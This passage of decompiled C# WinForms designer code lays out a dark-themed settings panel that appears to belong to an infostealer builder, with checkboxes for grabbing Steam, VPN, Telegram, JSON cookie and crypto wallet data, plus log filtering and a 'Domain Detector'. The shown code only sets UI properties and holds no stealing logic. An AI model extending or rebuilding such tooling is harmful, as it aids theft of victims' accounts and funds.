        ((System.Windows.Forms.Control)this.d1).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.d1).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.d1).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.d1).Location = new System.Drawing.Point(468, 107);
        ((System.Windows.Forms.Control)this.d1).Name = "telegramCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.d1).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.d1).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.d1).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.d1).StyleManager = null;
        ((System.Windows.Forms.Control)this.d1).TabIndex = 128;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.d1).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.d1).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.c9).AutoSize = true;
        ((System.Windows.Forms.Control)this.c9).Font = new System.Drawing.Font("Segoe UI", 11.75f);
        ((System.Windows.Forms.Control)this.c9).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.c9).Location = new System.Drawing.Point(288, 74);
        ((System.Windows.Forms.Control)this.c9).Name = "steamLbl";
        ((System.Windows.Forms.Control)this.c9).Size = new System.Drawing.Size(85, 21);
        ((System.Windows.Forms.Control)this.c9).TabIndex = 127;
        ((System.Windows.Forms.Control)this.c9).Text = "Get Steam:";
        ((System.Windows.Forms.Label)this.c9).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.ca).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ca).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ca).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ca).Checked = true;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ca).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ca).CheckState = MetroSet_UI.Enums.CheckState.Checked;
        ((System.Windows.Forms.Control)this.ca).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ca).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.ca).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.ca).Location = new System.Drawing.Point(468, 79);
        ((System.Windows.Forms.Control)this.ca).Name = "steamCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ca).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.ca).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ca).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ca).StyleManager = null;
        ((System.Windows.Forms.Control)this.ca).TabIndex = 126;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ca).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ca).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.cb).AutoSize = true;
        ((System.Windows.Forms.Control)this.cb).Font = new System.Drawing.Font("Segoe UI", 11.75f);
        ((System.Windows.Forms.Control)this.cb).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.cb).Location = new System.Drawing.Point(54, 128);
        ((System.Windows.Forms.Control)this.cb).Name = "vpnLbl";
        ((System.Windows.Forms.Control)this.cb).Size = new System.Drawing.Size(72, 21);
        ((System.Windows.Forms.Control)this.cb).TabIndex = 125;
        ((System.Windows.Forms.Control)this.cb).Text = "Get VPN:";
        ((System.Windows.Forms.Label)this.cb).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.cc).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cc).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cc).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cc).Checked = true;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cc).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cc).CheckState = MetroSet_UI.Enums.CheckState.Checked;
        ((System.Windows.Forms.Control)this.cc).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cc).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.cc).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.cc).Location = new System.Drawing.Point(229, 133);
        ((System.Windows.Forms.Control)this.cc).Name = "vpnCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cc).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.cc).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cc).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cc).StyleManager = null;
        ((System.Windows.Forms.Control)this.cc).TabIndex = 124;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cc).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cc).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.m_a5).AutoSize = true;
        ((System.Windows.Forms.Control)this.m_a5).Font = new System.Drawing.Font("Segoe UI", 11.75f);
        ((System.Windows.Forms.Control)this.m_a5).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.m_a5).Location = new System.Drawing.Point(288, 159);
        ((System.Windows.Forms.Control)this.m_a5).Name = "jsonCookiesLbl";
        ((System.Windows.Forms.Control)this.m_a5).Size = new System.Drawing.Size(111, 21);
        ((System.Windows.Forms.Control)this.m_a5).TabIndex = 123;
        ((System.Windows.Forms.Control)this.m_a5).Text = "JSON Cookies:";
        ((System.Windows.Forms.Label)this.m_a5).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.m_a6).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.m_a6).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.m_a6).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.m_a6).Checked = true;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.m_a6).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.m_a6).CheckState = MetroSet_UI.Enums.CheckState.Checked;
        ((System.Windows.Forms.Control)this.m_a6).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.m_a6).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.m_a6).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.m_a6).Location = new System.Drawing.Point(468, 164);
        ((System.Windows.Forms.Control)this.m_a6).Name = "jsonCookiesCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.m_a6).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.m_a6).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.m_a6).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.m_a6).StyleManager = null;
        ((System.Windows.Forms.Control)this.m_a6).TabIndex = 122;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.m_a6).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.m_a6).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetButton)this.domainDetectorImportBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.domainDetectorImportBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.domainDetectorImportBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.domainDetectorImportBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.domainDetectorImportBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.domainDetectorImportBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.domainDetectorImportBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.domainDetectorImportBtn).Location = new System.Drawing.Point(1057, 541);
        ((System.Windows.Forms.Control)this.domainDetectorImportBtn).Name = "domainDetectorImportBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.domainDetectorImportBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.domainDetectorImportBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.domainDetectorImportBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.domainDetectorImportBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.domainDetectorImportBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.domainDetectorImportBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.domainDetectorImportBtn).Size = new System.Drawing.Size(75, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.domainDetectorImportBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.domainDetectorImportBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.domainDetectorImportBtn).TabIndex = 115;
        ((System.Windows.Forms.Control)this.domainDetectorImportBtn).Text = "From File";
        ((MetroSet_UI.Controls.MetroSetButton)this.domainDetectorImportBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.domainDetectorImportBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.domainDetectorImportBtn).Click += new System.EventHandler(domainDetectorImportBtn_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.addDomainPatternBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addDomainPatternBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addDomainPatternBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.addDomainPatternBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.addDomainPatternBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.addDomainPatternBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.addDomainPatternBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.addDomainPatternBtn).Location = new System.Drawing.Point(1057, 570);
        ((System.Windows.Forms.Control)this.addDomainPatternBtn).Name = "addDomainPatternBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.addDomainPatternBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addDomainPatternBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addDomainPatternBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.addDomainPatternBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.addDomainPatternBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.addDomainPatternBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.addDomainPatternBtn).Size = new System.Drawing.Size(75, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.addDomainPatternBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.addDomainPatternBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.addDomainPatternBtn).TabIndex = 114;
        ((System.Windows.Forms.Control)this.addDomainPatternBtn).Text = "Add";
        ((MetroSet_UI.Controls.MetroSetButton)this.addDomainPatternBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.addDomainPatternBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.addDomainPatternBtn).Click += new System.EventHandler(addDomainPatternBtn_Click);
        ((GuiLib.AnimaTextBox)this.domainDetectorTb).Dark = false;
        ((System.Windows.Forms.Control)this.domainDetectorTb).Location = new System.Drawing.Point(547, 570);
        ((GuiLib.AnimaTextBox)this.domainDetectorTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.domainDetectorTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.domainDetectorTb).Name = "domainDetectorTb";
        ((GuiLib.AnimaTextBox)this.domainDetectorTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.domainDetectorTb).ReadOnly = false;
        ((System.Windows.Forms.Control)this.domainDetectorTb).Size = new System.Drawing.Size(504, 23);
        ((System.Windows.Forms.Control)this.domainDetectorTb).TabIndex = 113;
        ((GuiLib.AnimaTextBox)this.domainDetectorTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.label5).AutoSize = true;
        ((System.Windows.Forms.Control)this.label5).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label5).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label5).Location = new System.Drawing.Point(544, 550);
        ((System.Windows.Forms.Control)this.label5).Name = "label5";
        ((System.Windows.Forms.Control)this.label5).Size = new System.Drawing.Size(131, 15);
        ((System.Windows.Forms.Control)this.label5).TabIndex = 112;
        ((System.Windows.Forms.Control)this.label5).Text = "Enter a domain pattern:";
        ((System.Windows.Forms.Control)this.cd).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.ListBox)this.cd).BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
        ((System.Windows.Forms.Control)this.cd).ContextMenuStrip = (System.Windows.Forms.ContextMenuStrip)this.blackListCms_1;
        ((System.Windows.Forms.Control)this.cd).Cursor = System.Windows.Forms.Cursors.Default;
        ((System.Windows.Forms.Control)this.cd).Font = new System.Drawing.Font("Consolas", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.cd).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.ListBox)this.cd).HorizontalScrollbar = true;
        ((System.Windows.Forms.ListBox)this.cd).ItemHeight = 18;
        ((System.Windows.Forms.Control)this.cd).Location = new System.Drawing.Point(547, 372);
        ((System.Windows.Forms.Control)this.cd).Name = "domainDetectorLb";
        ((System.Windows.Forms.Control)this.cd).Size = new System.Drawing.Size(585, 164);
        ((System.Windows.Forms.Control)this.cd).TabIndex = 111;
        ((System.Windows.Forms.Control)this.label6).AutoSize = true;
        ((System.Windows.Forms.Control)this.label6).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label6).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label6).Location = new System.Drawing.Point(542, 339);
        ((System.Windows.Forms.Control)this.label6).Name = "label6";
        ((System.Windows.Forms.Control)this.label6).Size = new System.Drawing.Size(255, 30);
        ((System.Windows.Forms.Control)this.label6).TabIndex = 110;
        ((System.Windows.Forms.Control)this.label6).Text = "Domain Detector settings:";
        ((System.Windows.Forms.Label)this.label6).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetButton)this.pathsImportBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.pathsImportBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.pathsImportBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.pathsImportBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.pathsImportBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.pathsImportBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.pathsImportBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.pathsImportBtn).Location = new System.Drawing.Point(1057, 296);
        ((System.Windows.Forms.Control)this.pathsImportBtn).Name = "pathsImportBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.pathsImportBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.pathsImportBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.pathsImportBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.pathsImportBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.pathsImportBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.pathsImportBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.pathsImportBtn).Size = new System.Drawing.Size(75, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.pathsImportBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.pathsImportBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.pathsImportBtn).TabIndex = 109;
        ((System.Windows.Forms.Control)this.pathsImportBtn).Text = "From File";
        ((MetroSet_UI.Controls.MetroSetButton)this.pathsImportBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.pathsImportBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.pathsImportBtn).Click += new System.EventHandler(pathsImportBtn_Click);
        ((System.Windows.Forms.Control)this.userAgentLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.userAgentLbl).Font = new System.Drawing.Font("Segoe UI", 11.75f);
        ((System.Windows.Forms.Control)this.userAgentLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.userAgentLbl).Location = new System.Drawing.Point(288, 46);
        ((System.Windows.Forms.Control)this.userAgentLbl).Name = "userAgentLbl";
        ((System.Windows.Forms.Control)this.userAgentLbl).Size = new System.Drawing.Size(128, 21);
        ((System.Windows.Forms.Control)this.userAgentLbl).TabIndex = 108;
        ((System.Windows.Forms.Control)this.userAgentLbl).Text = "Block empty logs";
        ((System.Windows.Forms.Label)this.userAgentLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.blockEmptyLogsCb).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.blockEmptyLogsCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.blockEmptyLogsCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.blockEmptyLogsCb).Checked = false;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.blockEmptyLogsCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.blockEmptyLogsCb).CheckState = MetroSet_UI.Enums.CheckState.Unchecked;
        ((System.Windows.Forms.Control)this.blockEmptyLogsCb).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.blockEmptyLogsCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.blockEmptyLogsCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.blockEmptyLogsCb).Location = new System.Drawing.Point(468, 51);
        ((System.Windows.Forms.Control)this.blockEmptyLogsCb).Name = "blockEmptyLogsCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.blockEmptyLogsCb).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.blockEmptyLogsCb).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.blockEmptyLogsCb).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.blockEmptyLogsCb).StyleManager = null;
        ((System.Windows.Forms.Control)this.blockEmptyLogsCb).TabIndex = 107;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.blockEmptyLogsCb).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.blockEmptyLogsCb).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.grabColdWalletLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.grabColdWalletLbl).Font = new System.Drawing.Font("Segoe UI", 11.75f);
        ((System.Windows.Forms.Control)this.grabColdWalletLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.grabColdWalletLbl).Location = new System.Drawing.Point(54, 186);
        ((System.Windows.Forms.Control)this.grabColdWalletLbl).Name = "grabColdWalletLbl";
        ((System.Windows.Forms.Control)this.grabColdWalletLbl).Size = new System.Drawing.Size(92, 21);
        ((System.Windows.Forms.Control)this.grabColdWalletLbl).TabIndex = 106;
        ((System.Windows.Forms.Control)this.grabColdWalletLbl).Text = "Get Wallets:";
        ((System.Windows.Forms.Label)this.grabColdWalletLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.grabColdWalletCb).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabColdWalletCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabColdWalletCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabColdWalletCb).Checked = true;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabColdWalletCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabColdWalletCb).CheckState = MetroSet_UI.Enums.CheckState.Checked;
        ((System.Windows.Forms.Control)this.grabColdWalletCb).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabColdWalletCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.grabColdWalletCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.grabColdWalletCb).Location = new System.Drawing.Point(229, 190);
        ((System.Windows.Forms.Control)this.grabColdWalletCb).Name = "grabColdWalletCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabColdWalletCb).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.grabColdWalletCb).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabColdWalletCb).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabColdWalletCb).StyleManager = null;
        ((System.Windows.Forms.Control)this.grabColdWalletCb).TabIndex = 105;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabColdWalletCb).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabColdWalletCb).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.duplicateLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.duplicateLbl).Font = new System.Drawing.Font("Segoe UI", 11.75f);
        ((System.Windows.Forms.Control)this.duplicateLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.duplicateLbl).Location = new System.Drawing.Point(54, 157);
        ((System.Windows.Forms.Control)this.duplicateLbl).Name = "duplicateLbl";
        ((System.Windows.Forms.Control)this.duplicateLbl).Size = new System.Drawing.Size(110, 21);
        ((System.Windows.Forms.Control)this.duplicateLbl).TabIndex = 104;
        ((System.Windows.Forms.Control)this.duplicateLbl).Text = "Anti Duplicate:";
        ((System.Windows.Forms.Label)this.duplicateLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.duplicateCb).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.duplicateCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.duplicateCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.duplicateCb).Checked = true;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.duplicateCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.duplicateCb).CheckState = MetroSet_UI.Enums.CheckState.Checked;
        ((System.Windows.Forms.Control)this.duplicateCb).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.duplicateCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.duplicateCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.duplicateCb).Location = new System.Drawing.Point(229, 161);
        ((System.Windows.Forms.Control)this.duplicateCb).Name = "duplicateCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.duplicateCb).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.duplicateCb).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.duplicateCb).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.duplicateCb).StyleManager = null;
        ((System.Windows.Forms.Control)this.duplicateCb).TabIndex = 103;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.duplicateCb).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.duplicateCb).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.metroSetDivider10).Location = new System.Drawing.Point(0, 598);
        ((System.Windows.Forms.Control)this.metroSetDivider10).Name = "metroSetDivider10";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider10).Orientation = MetroSet_UI.Enums.DividerStyle.Horizontal;
        ((System.Windows.Forms.Control)this.metroSetDivider10).Size = new System.Drawing.Size(1273, 4);
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider10).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider10).StyleManager = null;
